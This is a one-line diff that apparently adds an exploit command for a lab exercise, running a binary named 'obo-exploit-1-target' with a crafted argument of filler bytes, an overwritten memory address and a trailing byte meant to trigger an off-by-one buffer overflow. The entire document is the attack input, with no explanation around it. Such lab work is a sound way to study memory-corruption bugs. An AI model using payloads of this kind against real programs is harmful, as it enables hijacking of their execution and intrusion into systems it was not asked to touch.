@@ -1,0 +1,1 @@
+./obo-exploit-1-target $(echo -e "AAAA\xc0\x96\x04\x08\AAAAAAAAAAAAAAAAAAAAAAA\xc8")
